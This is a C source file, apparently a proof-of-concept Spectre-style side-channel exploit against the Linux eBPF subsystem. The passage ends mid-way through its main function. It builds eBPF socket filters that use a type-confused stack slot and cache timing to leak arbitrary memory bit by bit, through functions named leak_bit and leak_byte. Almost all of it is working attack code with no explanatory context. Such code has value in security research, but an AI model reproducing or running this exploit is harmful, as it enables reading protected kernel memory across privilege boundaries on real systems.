#include <linux/bpf_common.h>
#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/user.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

int main_cpu, bounce_cpu, max_cpus;
void pin_task_to(int pid, int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))
    err(1, "affinity");
}
void pin_to(int cpu) { pin_task_to(0, cpu); }

int cache_dump_proc;

/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_JMP_REG(OP, DST, SRC, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_X,      \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

#define BPF_TEST_INS(code_,dst_reg_,src_reg_,off_,imm_)                 \
  ((struct bpf_insn) {                          \
    .code  = code_,       \
    .dst_reg = dst_reg_,                             \
    .src_reg = src_reg_,                               \
    .off   = off_,                                 \
    .imm   = imm_ })


int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 4,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  printf("==========================\n%s==========================\n", verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

/* assumes 32-bit values */
void array_set(int mapfd, uint32_t key, uint32_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem 32bit");
}

void array_set_ptr(int mapfd, uint32_t key, void *value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uintptr_t)value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem");
}

void array_set_2dw(int mapfd, uint32_t key, uint64_t value1, uint64_t value2) {
  uint64_t value[2] = { value1, value2 };
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem 2dw");
}

/* assumes 32-bit values */
uint32_t array_get(int mapfd, uint32_t key) {
  uint32_t value = 0;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };
  int res = bpf_(BPF_MAP_LOOKUP_ELEM, &attr);
  if (res)
    err(1, "map lookup elem");
  return value;
}

int prog_array_create() {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_PROG_ARRAY,
      .key_size = 4,
      .value_size = 4,
      .max_entries = 32
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

struct array_timed_reader_prog {
  int control_array;
  int sockfd;
};

struct array_timed_reader_prog create_timed_reader_prog(int timed_array_fd) {
  struct array_timed_reader_prog ret;

  /*
   * slot 0: timed_array index
   * slot 1: measured time delta
   */
  ret.control_array = array_create(4, 2);

  struct bpf_insn insns[] = {
    // r8 = index (bounded to 0x5000)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, 0),
    BPF_JMP_IMM(BPF_JLT, BPF_REG_8, 0x5000, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // r7 = timed array pointer
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_LD_MAP_FD(BPF_REG_ARG1, timed_array_fd),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    /* get time; speculation barrier */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* do the actual load */
    BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),
    BPF_LDX_MEM(BPF_B, BPF_REG_7, BPF_REG_7, 0),

    /*
     * get time delta; speculation barrier
     * r6 = ktime_get_ns() - r6
     */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* store time delta */
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_6, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  return ret;
}

/*
int bpf_create_cache_dump_prog(int array_fd, int idx, int tail_call_fd, int tail_call_idx){
  struct bpf_insn cache_dump_1[9+0x3ff*2+9];
  unsigned int post_offset = 9+0x3ff*2;
  memset(&cache_dump_1, 0, sizeof(cache_dump_1));
  cache_dump_1[0] = BPF_MOV64_REG(BPF_REG_7, BPF_REG_1);
  cache_dump_1[1] = BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP);
  cache_dump_1[2] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8);
  cache_dump_1[3] = BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, 0, idx);
  cache_dump_1[4] = BPF_LD_MAP_FD(BPF_REG_1, array_fd);
  cache_dump_1[6] = BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem);
  cache_dump_1[7] = BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1);
  cache_dump_1[8] = BPF_EXIT_INSN();
  for (int i = 0; i < 0x3ff; ++i)
  {
    cache_dump_1[9+2*i]= BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x1000);
    cache_dump_1[9+2*i+1]= BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0);
  }
  cache_dump_1[post_offset+0] = BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP);
  cache_dump_1[post_offset+1] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8);
  cache_dump_1[post_offset+2] = BPF_LD_MAP_FD(BPF_REG_2, tail_call_fd);
  cache_dump_1[post_offset+4] = BPF_MOV64_REG(BPF_REG_1, BPF_REG_7);
  cache_dump_1[post_offset+5] = BPF_MOV64_IMM(BPF_REG_3, tail_call_idx);
  cache_dump_1[post_offset+6] = BPF_EMIT_CALL(BPF_FUNC_tail_call);
  cache_dump_1[post_offset+7] = BPF_MOV64_IMM(BPF_REG_0, 0);
  cache_dump_1[post_offset+8] = BPF_EXIT_INSN();

  return create_filtered_socket_fd(cache_dump_1, ARRSIZE(cache_dump_1));
}

int bpf_create_tail_calls(int array_fd, int idx, int tail_call_fd, int tail_call_idx){
  struct bpf_insn cache_dump_1[9+0x3ff*2+9];
  unsigned int post_offset = 9+0x3ff*2;
  memset(&cache_dump_1, 0, sizeof(cache_dump_1));
  cache_dump_1[0] = BPF_MOV64_REG(BPF_REG_7, BPF_REG_1);
  cache_dump_1[1] = BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP);
  cache_dump_1[2] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8);
  cache_dump_1[3] = BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, 0, idx);
  cache_dump_1[4] = BPF_LD_MAP_FD(BPF_REG_1, array_fd);
  cache_dump_1[6] = BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem);
  cache_dump_1[7] = BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1);
  cache_dump_1[8] = BPF_EXIT_INSN();
  for (int i = 0; i < 0x3ff; ++i)
  {
    cache_dump_1[9+2*i]= BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x1000);
    cache_dump_1[9+2*i+1]= BPF_ST_MEM(BPF_DW, BPF_REG_0, 0, 0xfff);
  }
  cache_dump_1[post_offset+0] = BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP);
  cache_dump_1[post_offset+1] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8);
  cache_dump_1[post_offset+2] = BPF_LD_MAP_FD(BPF_REG_2, tail_call_fd);
  cache_dump_1[post_offset+4] = BPF_MOV64_REG(BPF_REG_1, BPF_REG_7);
  cache_dump_1[post_offset+5] = BPF_MOV64_IMM(BPF_REG_3, tail_call_idx);
  cache_dump_1[post_offset+6] = BPF_EMIT_CALL(BPF_FUNC_tail_call);
  cache_dump_1[post_offset+7] = BPF_MOV64_IMM(BPF_REG_0, 0);
  cache_dump_1[post_offset+8] = BPF_EXIT_INSN();

  return prog_load(cache_dump_1, ARRSIZE(cache_dump_1));
}

int create_trash_cache_progs(int array_fd){
  int sockfd,progfd; 
  int prog_array = prog_array_create();
  sockfd = bpf_create_cache_dump_prog(array_fd, 0,prog_array,0);
  for (int i = 1; i < 31; ++i)
  {
    progfd = bpf_create_tail_calls(array_fd, i,prog_array,i);
    array_set(prog_array, i-1, progfd);
  }
  return sockfd;
}
*/

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}

uint32_t perform_timed_read(struct array_timed_reader_prog *prog, int index) {
  array_set(prog->control_array, 0, index);
  array_set(prog->control_array, 1, 0x13371337); /* poison, for error detection */
  trigger_proc(prog->sockfd);
  uint32_t res = array_get(prog->control_array, 1);
  if (res == 0x13371337)
    errx(1, "got poison back after timed read, eBPF code is borked");
  return res;
}
unsigned int hot_cold_limit;


int bounce_sock_fd = -1;

void load_bounce_prog(int target_array_fd) {
  struct bpf_insn insns[] = {
    // r7 = timed array pointer
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_LD_MAP_FD(BPF_REG_ARG1, target_array_fd),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),

    BPF_ST_MEM(BPF_W, BPF_REG_0, 0x2000, 1),
    BPF_ST_MEM(BPF_W, BPF_REG_0, 0x3000, 1),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  bounce_sock_fd = create_filtered_socket_fd(insns, ARRSIZE(insns));
}

// 1 means "bounce it", -1 means "exit now"
volatile int cacheline_bounce_status;
int cacheline_bounce_fds[2];
void *cacheline_bounce_worker(void *arg) {
  pin_to(bounce_cpu);
  while (1) {
    __sync_synchronize();
    int cacheline_bounce_status_copy;
    while ((cacheline_bounce_status_copy = cacheline_bounce_status) == 0) /* loop */;
    if (cacheline_bounce_status_copy == -1)
      return NULL;
    __sync_synchronize();
    trigger_proc(bounce_sock_fd);
    __sync_synchronize();
    cacheline_bounce_status = 0;
    __sync_synchronize();
  }
}
void bounce_cachelines(void) {
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}
pthread_t cacheline_bounce_thread,dummy_worker_data;
void cacheline_bounce_worker_enable(void) {
  cacheline_bounce_status = 0;
  if (pthread_create(&cacheline_bounce_thread, NULL, cacheline_bounce_worker, NULL))
    errx(1, "pthread_create");
}
void cacheline_bounce_worker_disable(void) {
  cacheline_bounce_status = -1;
  if (pthread_join(cacheline_bounce_thread, NULL))
    errx(1, "pthread_join");
}


#define ABS(x) ((x)<0 ? -(x) : (x))

struct array_timed_reader_prog trprog;

#define THRESHOLD 25
#define THRESHOLD_MISS 200

int input_map, leak_map;
int sockfd;

struct input_t {
  uint64_t addr;
  uint64_t bitshift;
  uint64_t dummy;
};

unsigned int array_time_flush_loc(int mapfd, uint32_t idx, uint32_t off) {
  uint64_t time;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&idx,
    .value  = (uint64_t)&time,
    .flags  = off,
  };

  int res = bpf_(0x13370001, &attr);
  if (res)
    err(1, "map flush loc");
  return time;
}

int leak_bit(unsigned long addr, int bit) {
  struct input_t input;
  input.addr = addr;
  uint64_t hitrate = 0;
  input.bitshift = bit;
  int count_0 = 0, count_1 = 0;
  unsigned int current_cpu,current_numa;
  while ( ((count_0 - count_1) != 10) && ((count_1 - count_0) != 10)) {
    //main_cpu = (main_cpu + 1) %4;
    //bounce_cpu = (bounce_cpu+1)%4;
    
    input.dummy = 0x00;
    array_set_ptr(input_map, 0, &input);
    bounce_cachelines();
    trigger_proc(sockfd);
    unsigned int t1 = perform_timed_read(&trprog, 0x3000);

    input.dummy = 0xffffffffffffffff;
    array_set_ptr(input_map, 0, &input);
    bounce_cachelines();
    trigger_proc(sockfd);
    unsigned int t0 = perform_timed_read(&trprog, 0x2000);

    hitrate++;
    //printf("SMP ID Process %u \n",current_cpu);
    //printf("%u %u\n", t0, t1);
    if ( (t0 < THRESHOLD)  ) { //&& (t1 >THRESHOLD_MISS )
      //printf("%u %u CPU %d\n", t0, t1,bounce_cpu);
      count_0++;
    }
    if ( (t1 < THRESHOLD)  ) {
      //printf("%u %u CPU %d\n", t0, t1,bounce_cpu);
      count_1++;
    }
    if (hitrate > 100000)  //re-scheduling on stall, not that efficient/ not working as excepted
    {
      exit(-1); //since reschedule was unsuccessful just exit
      cacheline_bounce_worker_disable();    //update CPU
      main_cpu = (main_cpu + 1) %(max_cpus);  
      bounce_cpu = (bounce_cpu + 1 )%(max_cpus);
      cacheline_bounce_worker_enable();  //apply CPU changes
      pin_to(main_cpu);
      
      printf("Re-scheduling Main CPU %d, Bounce CPU %d\n",main_cpu,bounce_cpu);
      //getcpu(&current_cpu, &current_numa);
      //printf("Current CPU per call %d",current_cpu);
      hitrate=0;
    }
  }
  //printf("%04x: %d vs %d\n", bit, count_0, count_1);
  //printf("hitrate %f%%\n", 100*10.0/hitrate);
  return (count_0 > count_1) ? 0 : 1;
}

int leak_byte(unsigned long addr) {
  int value = 0;
  for (int bit=0; bit<8; bit++) {
    value |= leak_bit(addr, bit)<<bit;
    //printf("%04x: %02x\n", bit, value);
  }
  return value;
}

int main(int argc, char **argv) {
  setbuf(stdout, NULL);
  input_map = array_create(sizeof(struct input_t), 1);
  leak_map = array_create(0x1000*0x400, 30);

  if (argc != 4) {
    printf("invocation: %s <max-cpus> <hex-offset> <hex-length>\n", argv[0]);
    exit(1);
  }

  #define BPF_REG_CONFUSED_SLOT BPF_REG_6
  #define BPF_REG_SLOW_SLOT BPF_REG_7
  #define BPF_REG_LEAK_ARRAY BPF_REG_9
  //reg bitshift was already defined
  #define BPF_REG_CONFUSED BPF_REG_1
  #define BPF_REG_SECRET_VALUE BPF_REG_2
  #define BPF_REG_DUMMY_SLOT BPF_REG_3
  #define BPF_REG_CONFUSED_SLOT_ALIAS BPF_REG_4
  #define BPF_REG_DUMMY BPF_REG_5

    struct bpf_insn insns[] = {
      /* setup: compute stack slot pointers to :
       * - type-confused stack slot (at -72)
       * - pointer to type-confused stack slot (at -144)
       */
      BPF_MOV64_REG(BPF_REG_CONFUSED_SLOT, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_CONFUSED_SLOT, -72),
      BPF_MOV64_REG(BPF_REG_SLOW_SLOT, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT, -144),

      /* setup: store victim memory pointer in BPF_REG_CONFUSED_SLOT */
      BPF_LD_MAP_FD(BPF_REG_ARG1, input_map),
      BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
      BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
      BPF_EXIT_INSN(),
      BPF_LDX_MEM(BPF_DW, BPF_REG_DUMMY, BPF_REG_0, offsetof(struct input_t, dummy)),
      BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, offsetof(struct input_t, bitshift)),
      BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, offsetof(struct input_t, addr)),

      /* address of leaking slot */
      BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT, BPF_REG_1, 0),

      /* setup: write 0x00 or 0xff to -216 to get a big stack allocation and to prepare dummy */
      BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_DUMMY, -216),

      /* setup: spill pointer to type-confused stack slot */
      BPF_STX_MEM(BPF_DW, BPF_REG_SLOW_SLOT, BPF_REG_CONFUSED_SLOT, 0),

      /* setup: load pointer to leak area into register */
      BPF_LD_MAP_FD(BPF_REG_ARG1, leak_map),
      BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
      BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
      BPF_EXIT_INSN(),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x2000), /* leak_map+0x2000 */
      BPF_MOV64_REG(BPF_REG_LEAK_ARRAY, BPF_REG_0),

      
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5000, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5001, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5002, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5003, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5004, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5005, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5006, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5007, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5008, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5009, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x500a, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x500b, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x500c, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x500d, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x500e, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x500f, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5011, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5012, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5013, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5014, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5015, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5016, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5017, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5018, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5019, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x501a, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x501b, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x501c, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x501d, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x501e, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x501f, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5010, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5020, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5030, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5040, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5050, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5060, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5070, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5080, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5090, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x50a0, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x50b0, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x50c0, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x50d0, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x50e0, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5080, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5100, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5180, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5200, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5280, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5380, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5400, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5480, 0xffff),
      BPF_ST_MEM(BPF_DW, BPF_REG_LEAK_ARRAY, 0x5500, 0xffff),
